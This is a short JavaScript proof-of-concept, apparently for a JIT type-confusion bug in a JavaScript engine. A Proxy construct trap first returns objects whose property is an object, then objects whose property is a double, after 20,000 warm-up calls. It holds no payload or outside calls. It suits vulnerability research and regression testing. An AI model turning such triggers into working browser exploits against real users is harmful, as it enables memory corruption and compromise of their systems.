function poc(proxy, flag) {
  let o;
  if (flag) {
    o = Reflect.construct(proxy, []);
  } else {
    o = Reflect.construct(proxy, []);
  }
  return o.p;
}

class A {
  constructor() {
    this.p = {};
  }
}

class B {
  constructor() {
    this.p = 1.1;
  }
}

let type = A;
const p = new Proxy(function() {}, {
  construct: () => new type(),
});

for (let i = 0; i < 20000; i++) {
  poc(p, false);
}

type = B;
poc(p, true);